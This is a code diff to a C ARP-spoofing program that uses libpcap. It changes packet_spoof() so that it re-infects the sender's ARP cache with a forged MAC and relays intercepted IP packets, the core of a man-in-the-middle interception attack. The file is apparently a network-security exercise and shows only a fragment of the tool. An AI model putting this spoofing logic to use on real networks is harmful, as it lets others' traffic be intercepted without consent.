@@ -8,7 +8,7 @@
 #include <unistd.h>
 #include "arp_spoof.h"
 
-void packet_spoof(u_char *s_mac, u_char *d_mac, u_char *r_mac, struct in_addr s_ip, struct in_addr d_ip)
+void packet_spoof(u_char *s_mac, u_char *f_mac, u_char *d_mac, u_char *r_mac, struct in_addr s_ip, struct in_addr d_ip, struct in_addr r_ip)
 {
 	pcap_t *handle;			//Session handle
 	char dev[] = "eth0";		//The device to sniff on
@@ -55,23 +55,18 @@ void packet_spoof(u_char *s_mac, u_char *d_mac, u_char *r_mac, struct in_addr s_
 			if(ntohs(eth_hdr -> ether_type) == ETHERTYPE_ARP &&
 	   		   !memcmp(d_mac, eth_hdr -> ether_shost, ETHER_ADDR_LEN))
 			{
-				printf("Infect Sender again\n");
-				
-				send_arp((u_char *)packet, s_mac, d_mac, d_ip, s_ip, handle, header, 2);
+				send_arp((u_char *)packet, f_mac, d_mac, r_ip, d_ip, handle, header, 2);
+				printf("Infect Sender again\n\n");
 			}
 			else if(ntohs(eth_hdr -> ether_type) == ETHERTYPE_IP &&
 				!memcmp(d_mac, eth_hdr -> ether_shost, ETHER_ADDR_LEN))
 			{
+				send_arp((u_char *)packet, d_mac, r_mac, d_ip, r_ip, handle, header, 3);
 				printf("Relay Packet!\n\n");
-				send_arp((u_char *)packet, s_mac, r_mac, s_ip, d_ip, handle, header, 3);
 			}
 
 			result = pcap_next_ex(handle, &header, &packet);
 			free(tmp_packet);
-	/*
-			while(result <= 0)
-			{
-			}*/
 		}
 
 		if(result <= 0)
